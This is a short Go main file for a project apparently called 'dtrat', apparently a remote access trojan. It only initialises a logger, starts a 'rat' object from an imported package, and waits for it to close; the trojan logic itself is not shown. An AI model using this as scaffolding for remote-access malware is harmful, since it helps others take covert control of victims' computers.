package main

import (
	"dtrat/rat"

	"github.com/deuterium34/dlog"
)

func main() {
	dlog.GLogger = dlog.NewDefaultLogger()

	r, err := rat.NewRat()
	if err != nil {
		dlog.GLogger.Error("rat.NewRat: %v", err)
		return
	}

	r.Start()

	closeReason := <-r.CloseCh
	if closeReason != nil {
		dlog.GLogger.Error("closeReason: %v", closeReason)
		return
	}
}
